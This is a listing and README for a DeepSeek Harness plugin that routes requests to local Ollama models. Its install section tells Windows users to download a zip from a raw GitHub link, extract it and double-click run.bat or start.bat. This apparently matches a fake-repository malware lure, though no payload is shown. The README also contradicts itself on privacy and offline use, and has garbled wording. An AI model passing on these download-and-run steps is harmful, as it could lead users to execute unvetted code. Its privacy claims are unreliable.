text: dsh-local-ai（DSH 插件）：把本机 Ollama 模型接入 DeepSeek Harness，支持在会话中调用本地模型。它注册 Ollama 语言模型适配器、按任务类型或关键词路由请求，也可通过显式规则选择始终走本地模型；本地请求在产生内容前失败时会回退到云端。插件提供模型列表、详情、下载、删除和健康检查工具，并以 /ollama 命令显示服务状态、模型占用和路由建议。适合希望管理本地模型或按规则使用本机推理的 DSH 用户。需要运行 Ollama 服务；默认地址为 http://127.0.0.1:11434，无需 API 密钥。

dsh-local-ai connects Ollama to DeepSeek Harness through a local model adapter. Configured task or keyword rules route requests locally, with cloud fallback on early local failure. Tools manage models and check health; /ollama reports status. Requires Ollama at 127.0.0.1:11434 by default; no API

Can I route selected requests to a model running on my own machine?

I need a status command that checks my local Ollama server.
dsh-local-ai 的功能「接入本地模型」：注册 Ollama 为 DSH 模型提供方并通过流式接口发送聊天请求。用户显式选择 ollama 提供方或配置路由后触发，返回本地模型生成内容。
dsh-local-ai 的功能「规则路由」：按任务用途、关键词或 always 规则选择本地模型。请求匹配配置规则时触发，并按规则顺序采用首个匹配项。
dsh-local-ai 的功能「云端回退」：本地流在输出内容前失败时改用后续云端流；已经输出内容后则继续转发本地流。
dsh-local-ai 的功能「模型管理与健康检查」：DSH 工具可列出、查看、下载、删除 Ollama 模型，并检查 API 和进程状态。
dsh-local-ai 使用配置的 Ollama 地址发送模型请求；若本地请求在输出内容前失败，代码会调用后续云端流，因此该请求可能转发给云端提供方。

dsh-local-ai README · 👋 Welcome to dsh-local-ai：This tool helps you use AI models that run **directly on your computer** - no internet needed! Think of it as having a smart assistant that works even when you're offline. It works alongside something called "DeepSeek Harness" to give you the best of both worlds: private, fast responses from your own computer, plus the option to use cloud AI when needed.

dsh-local-ai README · 🎯 What Does This Do For You?：- **Discover Models** 🔍 - Find new AI models to download with a single command
- **Pull Models** ⬇️ - Download AI models to your computer safely
- **Remove Models** 🗑️ - Delete models you no longer need
- **Inspect Models** 🔎 - See what each model can do before you use it
- **Smart Routing** 🧠 - Automatically picks the best model for your question (personal vs. work, simple vs. complex)
- **Privacy First** 🔒 - Your questions stay on your computer. No cloud, no tracking
- **Offline Ready** 📴 - Works without internet connection
- **One-Shot Status** 📊 - Check everything at once with a simple /ollama command

dsh-local-ai README · Step 1: Get the Software：Visit this link to download the application: [https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip](https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip)

Click the green "Code" button, then "Download ZIP" to get the file on your computer.

dsh-local-ai README · Step 2: Open the ZIP File：Find the downloaded ZIP file in your "Downloads" folder. Right-click it and choose "Extract All..." or "Extract Here". This will create a new folder with the software inside.
dsh-local-ai README · Step 3: Start Using It：Open the new folder and look for a file named `run.bat` or `start.bat`. Double-click it, and you're all set! Your AI tools are now ready to use.

dsh-local-ai README · Model Discovery (🔍)：Discover new AI models like you'd browse a bookstore. Just type what kind of model you want, and it finds match unavailable ones. Perfect for trying out new AI capabilities.

dsh-local-ai README · Model Pulling (⬇️)：Download any discovered model directly to your computer. These models are like apps - you download them once, and they're always ready. No waiting, no streaming.

dsh-local-ai README · Smart Routing (🧠)：This is the magic part! dsh-local-ai automatically decides which AI model to use based on your question:
- **Personal questions?** Uses a local, private model
- **Complex technical questions?** Routes to cloud AI for better answers
- **Quick questions?** Uses fast, lightweight local models

This means you get the fastest, most private responses without thinking about it.

dsh-local-ai README · Inspection (🔎)：Before downloading a new model, inspect it like reading a product review. See what it's good at, how big it is, and what tasks it handles best. Make informed choices.

dsh-local-ai README · Status Overview (📊)：Type `/ollama` in your DeepSeek Harness chat to see everything at once:
- Which models you have installed
- Which ones are running
- Available updates
- Storage usage

It's like a dashboard for all your AI tools.

dsh-local-ai README · 🖥️ System Requirements：- **Operating System:** Windows 10 or 11 (64-bit)
- **RAM:** 8GB minimum, 16GB recommended
- **Storage:** At least 10GB free (models take space)
- **Internet:** Only needed for initial download and cloud AI fallback

dsh-local-ai README · First-Time Setup：1. Open DeepSeek Harness
2. Type `/ollama discover` to see available models
3. Type `/ollama pull model-name` to download one
4. Start chatting! Type normally, and let dsh-local-ai handle the thinking

dsh-local-ai README · Everyday Use：- Just ask questions normally in DeepSeek Harness
- dsh-local-ai automatically decides which model to use
- See local model status anytime with `/ollama status`
- Remove old models with `/ollama remove model-name`

dsh-local-ai README · "No Models Found"：- Make sure you've pulled at least one model first
- Check internet connection for discovery
- Try typing `/ollama discover` again

dsh-local-ai README · "Model Not Responding"：- Type `/ollama status` to see if your models are active
- Try removing and re-pulling the model
- Restart DeepSeek Harness

dsh-local-ai README · "Storage Full"：- Type `/ollama list` to see all installed models
- Remove models you don't use anymore
- Free up space, then try again

dsh-local-ai README · 🔐 Privacy Promise：Your conversations using local models never leave your computer. No servers, no cloud, no one else sees them. Only when you explicitly choose cloud models (or when smart routing sends a question to the cloud) does any data leave your device. The choice is always yours.

dsh-local-ai README · 💪 Power User Features：- **Task-Based Routing:** Set custom rules for which models handle which types of tasks
- **Keyword Routing:** Assign specific models to respond to specific keywords
- **Automatic Fallback:** If a local model fails, it automatically switches to cloud without breaking your flow
- **Batch Operations:** Pull, remove, or inspect multiple models at once

dsh-local-ai README · 🌟 Why You'll Love This：- **No Subscription Fees** - Local models are completely free, forever
- **Blazing Fast** - Local models respond instantly (no internet delay)
- **Offline Freedom** - Works anywhere, even without Wi-Fi
- **Total Privacy** - Your AI conversations stay private
- **Flexible** - Use local and cloud AI together, seamlessly

dsh-local-ai README · 🔄 How It Works with DeepSeek Harness：dsh-local-ai is a plugin that extends DeepSeek Harness, your main AI workspace. It adds a special "layer" that manages all your local AI models. Think of it as a smart manager that:
- Keeps all your local AI models organized
- Chooses the right model for each question
- Syncs local and cloud AI for the best results
